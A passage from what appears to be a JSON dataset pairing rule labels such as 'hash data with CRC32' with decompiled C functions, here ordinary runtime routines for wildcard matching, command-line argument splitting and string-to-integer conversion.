        "decompiled_code": "\nvoid __cdecl fcn.0045589c(uint16_t *arg_8h, int32_t arg_ch, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    uint16_t *puVar1;\n    uint uVar2;\n    uint uVar3;\n    char cVar4;\n    int32_t *in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(*in_ECX + 0xc) >> 0xc & 1) != 0) && (*(*in_ECX + 4) == 0)) {\n        *arg_10h = *arg_10h + arg_ch;\n        return;\n    }\n    uVar2 = *(arg_14h + 0x18);\n    uVar3 = *(arg_14h + 0x1c);\n    puVar1 = arg_8h + arg_ch;\n    if (arg_8h != puVar1) {\n        do {\n            cVar4 = fcn.00454f93(*arg_8h, arg_14h);\n            if (cVar4 == '\\0') {\n                if ((*(arg_14h + 0x1c) == '\\0') || (*(arg_14h + 0x18) != 0x2a)) {\n                    *arg_10h = -1;\n                    break;\n                }\n                cVar4 = fcn.00454f93(0x3f, arg_14h);\n                if (cVar4 != '\\0') goto code_r0x00455a77;\n                *arg_10h = -1;\n            }\n            else {\ncode_r0x00455a77:\n                *arg_10h = *arg_10h + 1;\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != puVar1);\n    }\n    *(arg_14h + 0x18) = uVar2;\n    *(arg_14h + 0x1c) = uVar3;\n    return;\n}\n",
        "token_count": 471
    },
    "00457067": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00457067(uint8_t *arg_8h, uint8_t **arg_ch, uint8_t *arg_10h, int32_t *arg_14h, int32_t *arg_18h)\n\n{\n    bool bVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    uint var_8h;\n    uint var_1h;\n    \n    *arg_18h = 0;\n    *arg_14h = 1;\n    if (arg_ch != NULL) {\n        *arg_ch = arg_10h;\n        arg_ch = arg_ch + 1;\n    }\n    uVar4 = 0;\n    do {\n        if (*arg_8h == 0x22) {\n            uVar4 = CONCAT11(uVar4 >> 8 == '\\0', 0x22);\n            puVar6 = arg_8h + 1;\n        }\n        else {\n            *arg_18h = *arg_18h + 1;\n            if (arg_10h != NULL) {\n                *arg_10h = *arg_8h;\n                arg_10h = arg_10h + 1;\n            }\n            uVar3 = *arg_8h;\n            uVar4 = uVar4 & 0xffffff00 | uVar3;\n            puVar6 = arg_8h + 1;\n            iVar5 = fcn.00462ecc(uVar3);\n            if (iVar5 != 0) {\n                *arg_18h = *arg_18h + 1;\n                if (arg_10h != NULL) {\n                    *arg_10h = *puVar6;\n                    arg_10h = arg_10h + 1;\n                }\n                puVar6 = arg_8h + 2;\n            }\n            if (uVar3 == 0) {\n                puVar6 = puVar6 + -1;\n                goto code_r0x004570f6;\n            }\n        }\n        arg_8h = puVar6;\n    } while ((uVar4 >> 8 != '\\0') || ((uVar4 != ' ' && (uVar4 != '\\t'))));\n    if (arg_10h != NULL) {\n        arg_10h[-1] = 0;\n    }\ncode_r0x004570f6:\n    bVar2 = false;\n    while (uVar3 = *puVar6,  uVar3 != 0) {\n        while ((uVar3 == 0x20 || (uVar3 == 9))) {\n            puVar6 = puVar6 + 1;\n            uVar3 = *puVar6;\n        }\n        if (uVar3 == 0) break;\n        if (arg_ch != NULL) {\n            *arg_ch = arg_10h;\n            arg_ch = arg_ch + 1;\n        }\n        *arg_14h = *arg_14h + 1;\n        while( true ) {\n            bVar1 = true;\n            uVar4 = 0;\n            for (; *puVar6 == 0x5c; puVar6 = puVar6 + 1) {\n                uVar4 = uVar4 + 1;\n            }\n            if (*puVar6 == 0x22) {\n                if ((uVar4 & 1) == 0) {\n                    if ((bVar2) && (puVar6[1] == 0x22)) {\n                        puVar6 = puVar6 + 1;\n                    }\n                    else {\n                        bVar1 = false;\n                        bVar2 = !bVar2;\n                    }\n                }\n                uVar4 = uVar4 >> 1;\n            }\n            while (uVar4 != 0) {\n                uVar4 = uVar4 - 1;\n                if (arg_10h != NULL) {\n                    *arg_10h = 0x5c;\n                    arg_10h = arg_10h + 1;\n                }\n                *arg_18h = *arg_18h + 1;\n            }\n            uVar3 = *puVar6;\n            if ((uVar3 == 0) || ((!bVar2 && ((uVar3 == 0x20 || (uVar3 == 9)))))) break;\n            if (bVar1) {\n                if (arg_10h != NULL) {\n                    *arg_10h = uVar3;\n                    arg_10h = arg_10h + 1;\n                }\n                iVar5 = fcn.00462ecc(*puVar6);\n                if (iVar5 != 0) {\n                    puVar6 = puVar6 + 1;\n                    *arg_18h = *arg_18h + 1;\n                    if (arg_10h != NULL) {\n                        *arg_10h = *puVar6;\n                        arg_10h = arg_10h + 1;\n                    }\n                }\n                *arg_18h = *arg_18h + 1;\n            }\n            puVar6 = puVar6 + 1;\n        }\n        if (arg_10h != NULL) {\n            *arg_10h = 0;\n            arg_10h = arg_10h + 1;\n        }\n        *arg_18h = *arg_18h + 1;\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = NULL;\n    }\n    *arg_14h = *arg_14h + 1;\n    return;\n}\n",
        "token_count": 1239
    },
    "004571db": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004571db(int16_t *arg_8h, int16_t **arg_ch, int16_t *arg_10h, int32_t *arg_14h, int32_t *arg_18h)\n\n{\n    bool bVar1;\n    bool bVar2;\n    int16_t iVar3;\n    uint32_t uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    *arg_18h = 0;\n    *arg_14h = 1;\n    if (arg_ch != NULL) {\n        *arg_ch = arg_10h;\n        arg_ch = arg_ch + 1;\n    }\n    bVar1 = false;\n    bVar2 = false;\n    do {\n        if (*arg_8h == 0x22) {\n            bVar1 = !bVar1;\n            iVar3 = 0x22;\n            bVar2 = bVar1;\n        }\n        else {\n            *arg_18h = *arg_18h + 1;\n            if (arg_10h != NULL) {\n                *arg_10h = *arg_8h;\n                arg_10h = arg_10h + 1;\n            }\n            iVar3 = *arg_8h;\n            if (iVar3 == 0) goto code_r0x00457271;\n        }\n        arg_8h = arg_8h + 1;\n    } while ((bVar2) || ((iVar3 != 0x20 && (iVar3 != 9))));\n    if (arg_10h != NULL) {\n        arg_10h[-1] = 0;\n    }\ncode_r0x00457271:\n    bVar1 = false;\n    while( true ) {\n        iVar3 = *arg_8h;\n        if (iVar3 != 0) {\n            while ((iVar3 == 0x20 || (iVar3 == 9))) {\n                arg_8h = arg_8h + 1;\n                iVar3 = *arg_8h;\n            }\n        }\n        if (iVar3 == 0) break;\n        if (arg_ch != NULL) {\n            *arg_ch = arg_10h;\n            arg_ch = arg_ch + 1;\n        }\n        *arg_14h = *arg_14h + 1;\n        while( true ) {\n            uVar4 = 0;\n            bVar2 = true;\n            iVar3 = *arg_8h;\n            while (iVar3 == 0x5c) {\n                arg_8h = arg_8h + 1;\n                uVar4 = uVar4 + 1;\n                iVar3 = *arg_8h;\n            }\n            if (iVar3 == 0x22) {\n                if ((uVar4 & 1) == 0) {\n                    if ((bVar1) && (arg_8h[1] == 0x22)) {\n                        arg_8h = arg_8h + 1;\n                    }\n                    else {\n                        bVar2 = false;\n                        bVar1 = !bVar1;\n                    }\n                }\n                uVar4 = uVar4 >> 1;\n            }\n            while (uVar4 != 0) {\n                uVar4 = uVar4 - 1;\n                if (arg_10h != NULL) {\n                    *arg_10h = 0x5c;\n                    arg_10h = arg_10h + 1;\n                }\n                *arg_18h = *arg_18h + 1;\n            }\n            iVar3 = *arg_8h;\n            if ((iVar3 == 0) || ((!bVar1 && ((iVar3 == 0x20 || (iVar3 == 9)))))) break;\n            if (bVar2) {\n                if (arg_10h != NULL) {\n                    *arg_10h = iVar3;\n                    arg_10h = arg_10h + 1;\n                }\n                *arg_18h = *arg_18h + 1;\n            }\n            arg_8h = arg_8h + 1;\n        }\n        if (arg_10h != NULL) {\n            *arg_10h = 0;\n            arg_10h = arg_10h + 1;\n        }\n        *arg_18h = *arg_18h + 1;\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = NULL;\n    }\n    *arg_14h = *arg_14h + 1;\n    return;\n}\n",
        "token_count": 1011
    },
    "0045ad90": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.0045ad90(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    bool bVar1;\n    bool bVar2;\n    \n    if ((arg_8h & 4) != 0) {\n        return 1;\n    }\n    if ((arg_8h & 1) != 0) {\n        if ((arg_8h & 2) == 0) {\n            if (0x7fffffff < arg_10h) {\n                return 1;\n            }\n            if (arg_10h < 0x7fffffff) {\n                return 0;\n            }\n            bVar1 = arg_ch != -1;\n            bVar2 = arg_ch == -1;\n        }\n        else {\n            if (0x80000000 < arg_10h) {\n                return 1;\n            }\n            if (arg_10h < 0x80000000) {\n                return 0;\n            }\n            bVar1 = false;\n            bVar2 = arg_ch == 0;\n        }\n        if (!bVar1 && !bVar2) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 265
    },
    "0045ae07": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0045ae07(int32_t arg_8h, uint8_t *arg_ch, uint8_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar2 = arg_ch;\n    cVar3 = fcn.00453fcc();\n    if (cVar3 == '\\0') {\ncode_r0x0045ae4c:\n        if (arg_10h != NULL) {\n            *arg_10h = arg_ch;\n        }\n        return 0;\n    }\n    if ((arg_14h != 0) && ((arg_14h < 2 || (0x24 < arg_14h)))) {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_8h);\n        goto code_r0x0045ae4c;\n    }\n    var_ch = 0;\n    uVar6 = *arg_ch;\n    arg_ch = arg_ch + 1;\n    var_4h = var_4h & 0xffffff00 | uVar6;\n    if (*(arg_8h + 0x14) == '\\0') {\n        fcn.00453bd0();\n    }\n    while (iVar4 = fcn.0045c29e(uVar6, 8, arg_8h + 0xc),  iVar4 != 0) {\n        uVar6 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        var_4h = var_4h & 0xffffff00 | uVar6;\n    }\n    var_8h = arg_18h & 0xff;\n    if (uVar6 == 0x2d) {\n        var_8h = var_8h | 2;\ncode_r0x0045aec2:\n        uVar6 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        var_4h = var_4h & 0xffffff00 | uVar6;\n    }\n    else if (uVar6 == 0x2b) goto code_r0x0045aec2;\n    if ((arg_14h != 0) && (arg_14h != 0x10)) goto code_r0x0045af4f;\n    if (uVar6 - 0x30 < 10) {\n        iVar4 = uVar6 + -0x30;\ncode_r0x0045af0a:\n        if (iVar4 == 0) {\n            uVar1 = *arg_ch;\n            var_10h = var_10h & 0xffffff00 | uVar1;\n            if ((uVar1 == 0x78) || (uVar1 == 0x58)) {\n                if (arg_14h == 0) {\n                    arg_14h = 0x10;\n                }\n                uVar6 = arg_ch[1];\n                arg_ch = arg_ch + 2;\n                var_4h = var_4h & 0xffffff00 | uVar6;\n            }\n            else {\n                if (arg_14h == 0) {\n                    arg_14h = 8;\n                }\n                fcn.00453702(var_10h);\n                arg_ch = arg_ch + 1;\n            }\n            goto code_r0x0045af4f;\n        }\n    }\n    else {\n        if (uVar6 + 0x9f < 0x1a) {\n            iVar4 = uVar6 + -0x57;\n            goto code_r0x0045af0a;\n        }\n        if (uVar6 + 0xbf < 0x1a) {\n            iVar4 = uVar6 + -0x37;\n            goto code_r0x0045af0a;\n        }\n    }\n    if (arg_14h == 0) {\n        arg_14h = 10;\n    }\ncode_r0x0045af4f:\n    while( true ) {\n        if (uVar6 - 0x30 < 10) {\n            uVar5 = uVar6 - 0x30;\n        }\n        else if (uVar6 + 0x9f < 0x1a) {\n            uVar5 = uVar6 - 0x57;\n        }\n        else if (uVar6 + 0xbf < 0x1a) {\n            uVar5 = uVar6 - 0x37;\n        }\n        else {\n            uVar5 = 0xffffffff;\n        }\n        if (arg_14h <= uVar5) break;\n        uVar5 = var_ch * arg_14h + uVar5;\n        uVar6 = *arg_ch;\n        var_4h = var_4h & 0xffffff00 | uVar6;\n        var_8h = var_8h | (uVar5 < var_ch * arg_14h || 0xffffffff / arg_14h < var_ch) << 2 | 8;\n        arg_ch = arg_ch + 1;\n        var_ch = uVar5;\n    }\n    fcn.00453702(var_4h);\n    if ((var_8h & 8) == 0) {\n        if (arg_10h == NULL) {\n            return 0;\n        }\n        *arg_10h = puVar2;\n        return 0;\n    }\n    cVar3 = fcn.0043fe43(var_8h, var_ch);\n    if (cVar3 == '\\0') {\n        if ((var_8h & 2) != 0) {\n            var_ch = -var_ch;\n        }\n    }\n    else {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x22;\n        if ((var_8h & 1) != 0) {\n            if ((var_8h & 2) == 0) {\n                if (arg_10h != NULL) {\n                    *arg_10h = arg_ch;\n                }\n                return 0x7fffffff;\n            }\n            if (arg_10h != NULL) {\n                *arg_10h = arg_ch;\n            }\n            return 0x80000000;\n        }\n        var_ch = 0xffffffff;\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n        return var_ch;\n    }\n    return var_ch;\n}\n",
        "token_count": 1543
    },
    "0045b04e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0045b04e(int32_t arg_8h, uint16_t *arg_ch, uint16_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint16_t *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint16_t uVar5;\n    uint32_t arg_8h_00;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar1 = arg_ch;\n    cVar2 = fcn.00453fe7();\n    if (cVar2 == '\\0') {\ncode_r0x0045b097:\n        if (arg_10h != NULL) {\n            *arg_10h = arg_ch;\n        }\n        return 0;\n    }\n    if ((arg_14h != 0) && ((arg_14h < 2 || (0x24 < arg_14h)))) {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_8h);\n        goto code_r0x0045b097;\n    }\n    var_4h = 0;\n    arg_8h_00 = *arg_ch;\n    arg_ch = arg_ch + 1;\n    if (*(arg_8h + 0x14) == '\\0') {\n        fcn.00453bd0();\n    }\n    while (iVar3 = fcn.00468d2e(arg_8h_00, 8),  iVar3 != 0) {\n        arg_8h_00 = *arg_ch;\n        arg_ch = arg_ch + 1;\n    }\n    arg_18h = arg_18h & 0xff;\n    if (arg_8h_00 == 0x2d) {\n        arg_18h = arg_18h | 2;\ncode_r0x0045b101:\n        arg_8h_00 = *arg_ch;\n        arg_ch = arg_ch + 1;\n    }\n    else if (arg_8h_00 == 0x2b) goto code_r0x0045b101;\n    var_8h = 0x660;\n    if ((arg_14h != 0) && (arg_14h != 0x10)) goto code_r0x0045b400;\n    uVar5 = arg_8h_00;\n    if (uVar5 < 0x30) goto code_r0x0045b38d;\n    iVar3 = 0x30;\n    if (uVar5 < 0x3a) {\ncode_r0x0045b230:\n        iVar3 = -iVar3;\ncode_r0x0045b388:\n        iVar3 = arg_8h_00 + iVar3;\n        if (iVar3 == -1) goto code_r0x0045b38d;\ncode_r0x0045b3b2:\n        if (iVar3 == 0) {\n            uVar4 = *arg_ch;\n            if ((uVar4 == 0x78) || (uVar4 == 0x58)) {\n                if (arg_14h == 0) {\n                    arg_14h = 0x10;\n                }\n                arg_8h_00 = arg_ch[1];\n                arg_ch = arg_ch + 2;\n            }\n            else {\n                if (arg_14h == 0) {\n                    arg_14h = 8;\n                }\n                fcn.0045372b(uVar4);\n                arg_ch = arg_ch + 1;\n            }\n            goto code_r0x0045b400;\n        }\n    }\n    else {\n        if (uVar5 < 0xff10) {\n            if ((0x65f < uVar5) &&\n               ((iVar3 = var_8h,  uVar5 < 0x66a ||\n                ((iVar3 = 0x6f0,  0x6ef < uVar5 &&\n                 ((uVar5 < 0x6fa ||\n                  ((iVar3 = 0x966,  0x965 < uVar5 &&\n                   ((uVar5 < 0x970 ||\n                    ((iVar3 = 0x9e6,  0x9e5 < uVar5 &&\n                     ((uVar5 < 0x9f0 ||\n                      ((iVar3 = 0xa66,  0xa65 < uVar5 &&\n                       ((uVar5 < 0xa70 ||\n                        ((iVar3 = 0xae6,  0xae5 < uVar5 &&\n                         ((uVar5 < 0xaf0 ||\n                          ((iVar3 = 0xb66,  0xb65 < uVar5 &&\n                           ((uVar5 < 0xb70 ||\n                            ((iVar3 = 0xc66,  0xc65 < uVar5 &&\n                             ((uVar5 < 0xc70 ||\n                              ((iVar3 = 0xce6,  0xce5 < uVar5 &&\n                               ((uVar5 < 0xcf0 ||\n                                ((iVar3 = 0xd66,  0xd65 < uVar5 &&\n                                 ((uVar5 < 0xd70 ||\n                                  ((iVar3 = 0xe50,  0xe4f < uVar5 &&\n                                   ((uVar5 < 0xe5a ||\n                                    ((iVar3 = 0xed0,  0xecf < uVar5 &&\n                                     ((uVar5 < 0xeda ||\n                                      ((iVar3 = 0xf20,  0xf1f < uVar5 &&\n                                       ((uVar5 < 0xf2a ||\n                                        ((iVar3 = 0x1040,  0x103f < uVar5 &&\n                                         ((uVar5 < 0x104a ||\n                                          ((iVar3 = 0x17e0,  0x17df < uVar5 &&\n                                           ((uVar5 < 0x17ea || ((iVar3 = 0x1810,  0x180f < uVar5 && (uVar5 < 0x181a)))))\n                                           )))))))))))))))))))))))))))))))))))))))))))))))))))))))))\n            goto code_r0x0045b230;\n        }\n        else if (uVar5 < 0xff1a) {\n            iVar3 = -0xff10;\n            goto code_r0x0045b388;\n        }\ncode_r0x0045b38d:\n        if (((0x40 < arg_8h_00) && (arg_8h_00 < 0x5b)) || (arg_8h_00 - 0x61 < 0x1a)) {\n            uVar4 = arg_8h_00;\n            if (arg_8h_00 - 0x61 < 0x1a) {\n                uVar4 = arg_8h_00 - 0x20;\n            }\n            iVar3 = uVar4 - 0x37;\n            goto code_r0x0045b3b2;\n        }\n    }\n    if (arg_14h == 0) {\n        arg_14h = 10;\n    }\ncode_r0x0045b400:\n    do {\n        uVar5 = arg_8h_00;\n        if (uVar5 < 0x30) {\ncode_r0x0045b565:\n            if (((arg_8h_00 < 0x41) || (0x5a < arg_8h_00)) && ((arg_8h_00 < 0x61 || (0x7a < uVar5)))) {\n                uVar4 = 0xffffffff;\n            }\n            else {\n                uVar4 = arg_8h_00;\n                if (uVar5 - 0x61 < 0x1a) {\n                    uVar4 = arg_8h_00 - 0x20;\n                }\n                uVar4 = uVar4 - 0x37;\n            }\n        }\n        else {\n            if (0x39 < uVar5) {\n                iVar3 = 0xff10;\n                if (uVar5 < 0xff10) {\n                    iVar3 = 0x660;\n                    if (0x65f < uVar5) {\n                        if (uVar5 < 0x66a) {\ncode_r0x0045b55b:\n                            iVar3 = -iVar3;\n                            goto code_r0x0045b560;\n                        }\n                        iVar3 = 0x6f0;\n                        if (0x6ef < uVar5) {\n                            if (uVar5 < 0x6fa) goto code_r0x0045b55b;\n                            iVar3 = 0x966;\n                            if (0x965 < uVar5) {\n                                if (uVar5 < 0x970) goto code_r0x0045b55b;\n                                iVar3 = 0x9e6;\n                                if (0x9e5 < uVar5) {\n                                    if (uVar5 < 0x9f0) goto code_r0x0045b55b;\n                                    iVar3 = 0xa66;\n                                    if (0xa65 < uVar5) {\n                                        if (uVar5 < 0xa70) goto code_r0x0045b55b;\n                                        iVar3 = 0xae6;\n                                        if (0xae5 < uVar5) {\n                                            if (uVar5 < 0xaf0) goto code_r0x0045b55b;\n                                            iVar3 = 0xb66;\n                                            if (0xb65 < uVar5) {\n                                                if (uVar5 < 0xb70) goto code_r0x0045b55b;\n                                                iVar3 = 0xc66;\n                                                if (0xc65 < uVar5) {\n                                                    if (uVar5 < 0xc70) goto code_r0x0045b55b;\n                                                    iVar3 = 0xce6;\n                                                    if (0xce5 < uVar5) {\n                                                        if (uVar5 < 0xcf0) goto code_r0x0045b55b;\n                                                        iVar3 = 0xd66;\n                                                        if (0xd65 < uVar5) {\n                                                            if (uVar5 < 0xd70) goto code_r0x0045b55b;\n                                                            iVar3 = 0xe50;\n                                                            if (0xe4f < uVar5) {\n                                                                if (uVar5 < 0xe5a) goto code_r0x0045b55b;\n                                                                iVar3 = 0xed0;\n                                                                if (0xecf < uVar5) {\n                                                                    if (uVar5 < 0xeda) goto code_r0x0045b55b;\n                                                                    iVar3 = 0xf20;\n                                                                    if (0xf1f < uVar5) {\n                                                                        if (uVar5 < 0xf2a) goto code_r0x0045b55b;\n                                                                        iVar3 = 0x1040;\n                                                                        if (0x103f < uVar5) {\n                                                                            if (uVar5 < 0x104a) goto code_r0x0045b55b;\n                                                                            iVar3 = 0x17e0;\n                                                                            if (0x17df < uVar5) {\n                                                                                if (uVar5 < 0x17ea)\n                                                                                goto code_r0x0045b55b;\n                                                                                iVar3 = 0x1810;\n                                                                                if (0x180f < uVar5) {\n                                                                                    var_84h._0_2_ = 0x181a;\n                                                                                    goto code_r0x0045b559;\n                                                                                }\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    var_88h._0_2_ = 0xff1a;\n                    var_84h._0_2_ = var_88h;\ncode_r0x0045b559:\n                    if (uVar5 < var_84h) goto code_r0x0045b55b;\n                }\n                goto code_r0x0045b565;\n            }\n            iVar3 = -0x30;\ncode_r0x0045b560:\n            uVar4 = arg_8h_00 + iVar3;\n            if (uVar4 == 0xffffffff) goto code_r0x0045b565;\n        }\n        if (arg_14h <= uVar4) {\n            fcn.0045372b(arg_8h_00);\n            if ((arg_18h & 8) == 0) {\n                if (arg_10h == NULL) {\n                    return 0;\n                }\n                *arg_10h = puVar1;\n                return 0;\n            }\n            cVar2 = fcn.0043fe43(arg_18h, var_4h);\n            if (cVar2 == '\\0') {\n                if ((arg_18h & 2) != 0) {\n                    var_4h = -var_4h;\n                }\n            }\n            else {\n                *(arg_8h + 0x1c) = 1;\n                *(arg_8h + 0x18) = 0x22;\n                if ((arg_18h & 1) != 0) {\n                    if ((arg_18h & 2) == 0) {\n                        if (arg_10h != NULL) {\n                            *arg_10h = arg_ch;\n                        }\n                        return 0x7fffffff;\n                    }\n                    if (arg_10h != NULL) {\n                        *arg_10h = arg_ch;\n                    }\n                    return 0x80000000;\n                }\n                var_4h = 0xffffffff;\n            }\n            if (arg_10h != NULL) {\n                *arg_10h = arg_ch;\n                return var_4h;\n            }\n            return var_4h;\n        }\n        uVar4 = var_4h * arg_14h + uVar4;\n        arg_18h = arg_18h | (uVar4 < var_4h * arg_14h || 0xffffffff / arg_14h < var_4h) << 2 | 8;\n        arg_8h_00 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        var_4h = uVar4;\n    } while( true );\n}\n",
        "token_count": 3456
    },
    "0045b65c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0045b842)\n// WARNING: Removing unreachable block (ram,0x0045b85a)\n\nuint64_t __cdecl fcn.0045b65c(int32_t arg_8h, uint8_t *arg_ch, uint8_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    uint8_t *puVar3;\n    char cVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint8_t uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar3 = arg_ch;\n    cVar4 = fcn.00453fcc();\n    if (cVar4 == '\\0') {\ncode_r0x0045b6a2:\n        if (arg_10h != NULL) {\n            *arg_10h = arg_ch;\n        }\n        return 0;\n    }\n    if ((arg_14h != 0) && ((arg_14h < 2 || (0x24 < arg_14h)))) {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_8h);\n        goto code_r0x0045b6a2;\n    }\n    uVar7 = *arg_ch;\n    arg_ch = arg_ch + 1;\n    var_8h = var_8h & 0xffffff00 | uVar7;\n    if (*(arg_8h + 0x14) == '\\0') {\n        fcn.00453bd0();\n    }\n    uVar5 = arg_8h + 0xc;\n    iVar6 = fcn.0045c29e(uVar7, 8, uVar5);\n    while (iVar6 != 0) {\n        uVar7 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        var_8h = var_8h & 0xffffff00 | uVar7;\n        iVar6 = fcn.0045c29e(uVar7, 8, uVar5);\n    }\n    var_4h = arg_18h & 0xff;\n    if (uVar7 == 0x2d) {\n        var_4h = var_4h | 2;\ncode_r0x0045b736:\n        uVar7 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        var_8h = var_8h & 0xffffff00 | uVar7;\n    }\n    else if (uVar7 == 0x2b) goto code_r0x0045b736;\n    if ((arg_14h != 0) && (arg_14h != 0x10)) goto code_r0x0045b7c2;\n    if (uVar7 - 0x30 < 10) {\n        iVar6 = uVar7 + -0x30;\ncode_r0x0045b77e:\n        if (iVar6 == 0) {\n            uVar1 = *arg_ch;\n            var_ch = uVar5 & 0xffffff00 | uVar1;\n            if ((uVar1 == 0x78) || (uVar1 == 0x58)) {\n                if (arg_14h == 0) {\n                    arg_14h = 0x10;\n                }\n                uVar7 = arg_ch[1];\n                arg_ch = arg_ch + 2;\n                var_8h = var_8h & 0xffffff00 | uVar7;\n            }\n            else {\n                if (arg_14h == 0) {\n                    arg_14h = 8;\n                }\n                fcn.00453702(var_ch);\n                arg_ch = arg_ch + 1;\n            }\n            goto code_r0x0045b7c2;\n        }\n    }\n    else {\n        if (uVar7 + 0x9f < 0x1a) {\n            iVar6 = uVar7 + -0x57;\n            goto code_r0x0045b77e;\n        }\n        if (uVar7 + 0xbf < 0x1a) {\n            iVar6 = uVar7 + -0x37;\n            goto code_r0x0045b77e;\n        }\n    }\n    if (arg_14h == 0) {\n        arg_14h = 10;\n    }\ncode_r0x0045b7c2:\n    uVar8 = fcn.00476c00(0xffffffff, 0xffffffff, arg_14h, arg_14h >> 0x1f);\n    uVar2 = 0;\n    while( true ) {\n        iVar6 = uVar2 >> 0x20;\n        var_10h = uVar2;\n        if (uVar7 - 0x30 < 10) {\n            uVar5 = uVar7 - 0x30;\n        }\n        else if (uVar7 + 0x9f < 0x1a) {\n            uVar5 = uVar7 - 0x57;\n        }\n        else if (uVar7 + 0xbf < 0x1a) {\n            uVar5 = uVar7 - 0x37;\n        }\n        else {\n            uVar5 = 0xffffffff;\n        }\n        if (arg_14h <= uVar5) break;\n        uVar9 = fcn.00476ea0();\n        var_4h = var_4h | (uVar8 < uVar2) << 2 | 8;\n        uVar7 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        var_8h = var_8h & 0xffffff00 | uVar7;\n        uVar2 = uVar9;\n    }\n    fcn.00453702(var_8h);\n    if ((var_4h & 8) == 0) {\n        if (arg_10h == NULL) {\n            return 0;\n        }\n        *arg_10h = puVar3;\n        return 0;\n    }\n    cVar4 = fcn.0045ad90(var_4h, var_10h, iVar6);\n    if (cVar4 == '\\0') {\n        if ((var_4h & 2) != 0) {\n            uVar2 = CONCAT44(-(iVar6 + (var_10h != 0)), -var_10h);\n        }\n    }\n    else {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x22;\n        if ((var_4h & 1) != 0) {\n            if ((var_4h & 2) == 0) {\n                if (arg_10h != NULL) {\n                    *arg_10h = arg_ch;\n                }\n                return 0x7fffffffffffffff;\n            }\n            if (arg_10h != NULL) {\n                *arg_10h = arg_ch;\n            }\n            return 0x8000000000000000;\n        }\n        uVar2 = 0xffffffffffffffff;\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n        return uVar2;\n    }\n    return uVar2;\n}\n",
        "token_count": 1740
    },
    "0045b924": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
